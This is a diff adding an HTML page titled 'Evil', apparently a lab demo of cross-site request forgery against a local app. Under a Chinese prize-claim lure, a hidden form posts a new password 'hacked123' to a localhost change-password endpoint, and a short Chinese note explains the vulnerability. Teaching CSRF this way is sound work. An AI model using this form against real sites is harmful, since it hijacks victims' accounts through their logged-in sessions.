@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Evil</title>
+</head>
+<body>
+    <h1>您已中奖！点击领取</h1>
+    <details>
+        <summary>VULN: CSRF漏洞</summary>
+        <p>假设这是一个不同于源网站的恶意网站，点击领取后，如果你在源网站登录且保存了cookie，你在源网站的密码会被修改为<code>hacked123</code></p>
+        <p>在这个例子中，恶意网站本身和源网站是同源的，因此并不能很好地反映CSRF漏洞</p>
+    </details>
+    <form id="hack" action="http://127.0.0.1:5000/change-password" method="POST">
+        <input type="hidden" name="new_password" value="hacked123">
+        <input type="submit" value="领取">
+    </form>
+    <style>
+        code {
+            font-family: 'Courier New', Courier, monospace;
+        }
+    </style>
+</body>
+</html>
